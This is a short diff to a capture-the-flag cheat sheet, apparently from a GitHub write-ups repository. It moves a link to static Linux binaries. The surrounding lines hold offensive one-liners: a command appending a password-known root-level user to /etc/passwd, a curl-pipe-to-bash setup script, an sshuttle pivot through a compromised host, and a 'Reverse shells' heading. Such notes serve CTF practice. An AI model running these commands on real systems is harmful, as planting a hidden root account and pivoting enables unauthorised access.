@@ -8,7 +8,6 @@ My [setup script](https://github.com/ChrisPritchard/ctf-writeups/blob/master/thm
 curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash
 ```
 
-- Static binaries: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
 - passwd user to add (pass123): `echo 'user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash' >> /etc/passwd` (note the single quotes so $ is ignored)
 - ssh shuttle (to a machine with ssh AND python): `sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET` (ssh command is required if you need a keyfile)
 - listen for pings: `tcpdump -i eth0 icmp`
@@ -26,6 +25,7 @@ curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm
 - [LOLBAS - same as above but for windows](https://lolbas-project.github.io/#)
 - [WADComs - AD stuff](https://wadcoms.github.io/)
 - [StegOnline - beyond simple steghide](https://stegonline.georgeom.net/image)
+- [Static linux binaries](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) (copy /usr/share/nmap/nmap-services over as well for nmap)
 
 ## Reverse shells
 
